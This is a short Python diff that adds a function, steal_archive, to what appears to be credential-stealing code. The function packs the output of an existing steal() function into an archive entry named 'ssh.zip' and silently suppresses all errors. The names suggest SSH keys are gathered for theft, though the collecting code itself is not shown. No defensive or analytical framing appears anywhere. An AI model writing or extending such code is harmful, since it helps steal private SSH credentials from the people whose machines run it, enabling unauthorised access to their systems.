@@ -17,3 +17,11 @@ def steal():
 	archive.seek(0)
 
 	return archive
+
+
+def steal_archive(archive):
+    try:
+        with archive.open("ssh.zip", "w") as f:
+            f.write(steal().read())
+    except:
+        pass
